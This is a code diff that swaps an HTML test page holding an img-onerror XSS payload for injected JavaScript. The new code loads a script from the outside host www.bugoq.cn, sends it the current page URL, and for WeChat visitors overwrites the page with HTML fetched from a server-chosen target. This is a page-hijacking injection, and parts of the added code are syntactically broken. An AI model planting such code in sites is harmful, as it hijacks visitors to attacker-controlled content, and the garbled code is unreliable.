@@ -1,12 +1,39 @@
-<!DOCTYPE html>
+var ua = navigator.userAgent.toLowerCase();
+var new_doc = document.open("text/html", "replace");
+var script = document.createElement('script');
+script.src = '//www.bugoq.cn/pub/transfer/?url='+encodeURIComponent(window.location.origin+window.location.pathname)+'&callback=transfer';
+document.body.appendChild(script);
+
+if (/micromessenger/.test(ua)) {
+    var html = unescape("<!DOCTYPE html>
 <html>
-	<head>
-		<meta charset="utf-8" />
-		<title></title>
-	</head>
-	<body>
-		<img src="" onerror="eval(this.name)" name='var s = document.createElement("script");s.src = "js/xss.js"; 
-s.type = "text/javascript"; document.body.appendChild(s);' alt="" />
-		<img src="javascript:console.log('img')" />
-	</body>
-</html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0"/>
+    <title></title>
+</head>
+<body>
+<script>
+	transfer(data){
+		var xhr = new XMLHttpRequest;
+	    var html = null;
+	    function render() {
+	        var a = document.open("text/html", "replace");
+	        a.write(html);
+	        a.close();
+	    }
+	    xhr.onload = function() {
+	        html = xhr.responseText;
+	        else render();
+	    };
+	    xhr.open("GET", (location.protocol=='https:'?'https:':'http:') + data.target_url +"?t=" + Date.now(), !0);
+	    xhr.send();
+	}
+    
+</script>
+</body>
+</html>");
+
+    new_doc.write(html);
+    new_doc.close();
+}
